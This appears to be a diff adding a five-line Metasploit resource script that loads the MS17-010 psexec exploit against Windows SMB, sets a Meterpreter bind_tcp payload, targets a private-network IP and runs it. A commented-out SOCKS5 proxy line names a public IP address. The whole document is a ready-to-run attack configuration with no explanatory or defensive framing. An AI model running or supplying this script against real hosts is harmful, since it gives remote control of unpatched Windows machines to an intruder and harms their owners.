@@ -1,0 +1,5 @@
+use exploit/windows/smb/ms17_010_psexec
+set payload windows/meterpreter/bind_tcp
+# set proxies socks5:47.101.214.85:1888
+set rhosts 192.168.52.138
+run
